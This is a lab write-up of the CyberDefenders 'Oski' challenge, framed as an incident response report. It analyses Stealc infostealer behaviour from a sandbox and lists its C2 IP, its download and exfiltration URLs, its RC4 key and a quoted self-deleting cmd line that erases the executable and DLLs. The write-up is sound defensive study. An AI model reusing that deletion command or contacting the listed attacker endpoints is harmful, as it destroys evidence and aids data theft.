# Incident Response Report: Oski (CyberDefenders)

## Scenario
The accountant at the company received an email titled "Urgent New Order" from a client late in the afternoon. When he attempted to access the attached invoice, he discovered it contained false order information. Subsequently, the SIEM solution generated an alert regarding downloading a potentially malicious file. Upon initial investigation, it was found that the PTT file might be responsible for this download. Could you please conduct a detailed examination of this file?

Analyze a sandbox report using Any.Run to identify Stealc malware behavior, extract configuration details, and map observed tactics to MITRE ATT&CK.

### 1. Executive Summary
*An invoice contained false order information from an email was found. The PTT file was analyzed using VirusTotal and ANY.RUN to determine the attack vector, and the malicious payload.*

### 2. Incident Details
* **Lab/Challenge:** Oski (CyberDefenders)
* **Category:** Threat Intel / SOC Analyst Tier 1
* **Tools Used:** VirusTotal, ANY.RUN
* **Date of Investigation:** 4-25-2026

### 3. Investigation Methodology & Findings
* **Step 1: Identifying the Threat actor**
  * *Method:* Extracted the payload, grabbed the MD5 hash associated with the PTT file, pivoted to VirusTotal. Identifying it as a Trojan/Ransomware, which does data exfiltration and credential theft. Next, determine the creation time of the malware. This helps to build a timeline of the attack if it's targeted, active campaign or just a commodity malware.
  * *Finding:* `12c1842c3ccafe7408c23ebf292ee3d9` MD5 hash. `2022-09-28 17:40` pulled from file's Portable Executable or PE header. Can be found in VirusTotal's Detail Tab History section.
  `VPN.exe.bin` is the name of the malware.

* **Step 2: Identifying the Attacker & Payload Delivery**
  * *Method:* Identify the command and control (C2) server that the malware communicates with to help trace back to the attacker. Check the file's network activity for outbound connections to URLs or IP addresses, as these may indicate communication with a command and control (C2) server. Found the `GET` and `POST` HTTP requests which indicate that this device send a `GET` request to download the `sqlite3.dll` from `171.22.28.221` and send `POST` request to upload data to `171.22.28.221/5c06c05b7b34e8e6.php` endpoint. Next, Identify the initial actions of the malware post-infection to reveal its primary objectives. `sqlite3.dll` is the first library DLL file that the malware request post-infection. Its objective is  to steal information, harvest saved credentials, session cookiesm credit card numbers, autofill data from web browsers, to access these sensitive data, it has to access SQLite database. Next find the `RC4 key` used for encryption or decryption (Obfuscation) may be embedded in the malware configuration. Examine the Any.run report and found the `RC4 key`. Examine the MITRE ATT&CK techniques displayed in the Any.run sandbox report, identify the main MITRE technique the malware uses to steal the user's password. `T1555` is the T-code for Credentials from Password Stores, which specifically targeting and extracting credentials from local system files, password managers, or browser databases. Malware often deletes files to cover its tracks. Examine the child processes displayed in the Any.run sandbox report, to indicate which directory does the malware target for the deletion of all DLL files. Spot the `C:\ProgramData\*.dll`, indicate the exact target. This is Anti-Forensics / Indicator Removal on Host `(T1070.004)`.
  * *Finding:* The attacker's IP address was identified as `171.22.28.221`. `GET http://171.22.28.221/9e226a84ec50246d/sqlite3.dll` and `POST http://171.22.28.221/5c06c05b7b34e8e6.php` pulled from Relation Tab in Contact URLs field and Behavior tab Network Communication field. `sqlite3.dll` pulled from ehavior tab File Dropped field. `5329514621441247975720749009` The RC4 key pulled from `https://any.run/report/a040a0af8697e30506218103074c7d6ea77a84ba3ac1ee5efae20f15530a19bb/d55e2294-5377-4a45-b393-f5a8b20f7d44` Malware Configuration section Key: RC4 field. Indicator Removal on Host `Starts CMD.EXE for self-deleting` with cmdline: `"C:\Windows\system32\cmd.exe" /c timeout /t 5 & del /f /q "C:\Users\admin\AppData\Local\Temp\VPN.exe" & del "C:\ProgramData\*.dll"" & exit`

* **Step 3: Compromised Data**
  * *Method:* Since the attack is Control and Command (C2), the HTTP request `POST http://171.22.28.221/5c06c05b7b34e8e6.php`, indicate the exfiltration but cannot identify which exact data is exfiltrated due to no further investigation (out of scope).
  * *Finding:* The attacker exfiltrated the credentials from the host via HTTP request to bypass DNS filtering and avoid signature-based detection mechanism by using `5c06c05b7b34e8e6.php` endpoint.

### 4. Indicators of Compromise (IoCs)
* **Attacker IP Address(es):** `171.22.28.221`
* **The Suspicious File:** `The PTT file` with MD5 hash `12c1842c3ccafe7408c23ebf292ee3d9`
* **The Suspicious URI:** `5c06c05b7b34e8e6.php`

### 5. Mitigation & Recommendations
* Implement signature-based of known malwares in IDS/IPS, AVs
* Find a way to prevent Defense Evasion.
* Implement strict file validation on the sending outbound HTTP request to an unknown enpoint.
